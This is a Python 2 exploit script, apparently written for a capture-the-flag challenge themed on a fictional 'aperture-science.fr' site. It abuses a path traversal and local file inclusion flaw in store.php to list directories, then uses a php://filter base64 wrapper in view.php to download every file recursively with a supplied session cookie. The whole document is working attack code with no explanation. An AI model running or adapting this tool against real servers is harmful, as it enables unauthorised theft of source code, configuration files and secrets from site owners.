#!/usr/bin/python

import base64
import os
import re
import requests
import sys

# https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

exclude = ['connected_missile.ova']

def grab(vhost, root, cookie, lroot):

    print '[-] Grabbing directory %s' % root

    # LFI
    url = 'https://%s.aperture-science.fr/store.php?f=../../%s' % (vhost, root)
    req = requests.get(url, verify = False, cookies = {'PHPSESSID': cookie})
    
    dirs = []
    files = []
    
    SEP = '<h3>Associated '
    n = req.text.count(SEP)
    
    if n==0:
        return
        
    if n==2:
        _, filet, dirt = req.text.split(SEP)
        
    if n==1:
        _, unknown = req.text.split(SEP)
        filet, dirt = ('', unknown) if unknown.startswith('directories') else (unknown, '')
        

    filer = re.findall(r'<li>([^<]+)</li>', filet)
    dirr = re.findall(r'<li>([^<]+)</li>', dirt)
    
    # FILES
    for f in filer:
        if f in exclude:
            continue
            
        print '[-] Grabbing file %s/%s' % (root, f)
            
        filen = '%s/%s' % (root, f)
        url = 'https://%s.aperture-science.fr/view.php?name=php://filter/convert.base64-encode/resource=%s' % (vhost, filen)
        req = requests.get(url, verify = False, cookies = {'PHPSESSID': cookie})
        
        f = open(os.path.join(lroot, f), 'wb')
        f.write(base64.b64decode(req.text))
        f.close()
    
    # DIRS
    for d in dirr:
        if d in exclude:
            continue
            
        path = '%s/%s' % (root, d)
        lpath = os.path.join(lroot, d)
        
        if not os.path.isdir(lpath):
            os.mkdir(lpath)
            
        grab(vhost, path, cookie, lpath)
            
    return
    

if __name__ == '__main__':

    if len(sys.argv)<5:
        print 'Usage: %s <vhost> <PHPSESSID> <root> <localroot>' % sys.argv[0]
        sys.exit(1)
    
    vhost = sys.argv[1]
    cookie = sys.argv[2]
    root = sys.argv[3]
    lroot = sys.argv[4]
    
    if root!='/':
        while root[-1] == '/':
            root = root[:-1]
            
    if lroot!='/':
        while lroot[-1] == '/':
            lroot = lroot[:-1]
    
    if os.path.isfile(lroot):
        print 'Fatal error, cannot make directory, already a file under that name'
        sys.exit(2)
        
    if not os.path.isdir(lroot):
        os.mkdir(lroot)
    
    grab(vhost, root, cookie, lroot)
